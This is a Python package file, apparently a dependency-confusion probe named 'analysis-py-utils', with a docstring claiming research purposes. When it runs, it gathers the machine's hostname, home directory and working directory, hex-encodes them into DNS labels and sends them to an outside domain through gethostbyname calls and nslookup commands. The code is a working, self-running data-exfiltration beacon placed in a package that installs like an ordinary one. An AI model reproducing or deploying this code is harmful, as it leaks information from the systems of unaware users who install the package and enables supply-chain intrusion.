'''

This code is used for research purposes.

No sensitive data is retrieved.

Callbacks from within organizations with a
responsible disclosure program will be reported
directly to the organizations.

Any other callbacks will be ignored, and
any associated data will not be kept.

For any questions or suggestions:

alex@ethicalhack.ro
https://twitter.com/alxbrsn

'''

import os
import socket
import json
import binascii
import random
import string


PACKAGE = 'analysis-py-utils'
SUFFIX = '.dns.thewhybee.com';
NS = 'dns1.thewhybee.com';


def generate_id():
    return ''.join(random.choice(
        string.ascii_lowercase + string.digits) for _ in range(12)
    )

def get_hosts(data):

    data = binascii.hexlify(data.encode('utf-8'))
    data = [data[i:i+60] for i in range(0, len(data), 60)]
    data_id = generate_id()

    to_resolve = []
    for idx, chunk in enumerate(data):
        to_resolve.append(
            'v3_f.{}.{}.{}.v8_f{}'.format(
                data_id, idx, chunk.decode('ascii'), SUFFIX)
            )

    return to_resolve


def try_call(func, *args):
    try:
        return func(*args)
    except:
        return 'err'


data = {
    'p' : PACKAGE,
    'h' : try_call(socket.getfqdn),
    'd' : try_call(os.path.expanduser, '~'),
    'c' : try_call(os.getcwd)
}

data = json.dumps(data)

to_resolve = get_hosts(data)
for host in to_resolve:
    try:
        socket.gethostbyname(host)
    except:
        pass

to_resolve = get_hosts(data)
for host in to_resolve:
    os.system('nslookup {} {}'.format(host, NS))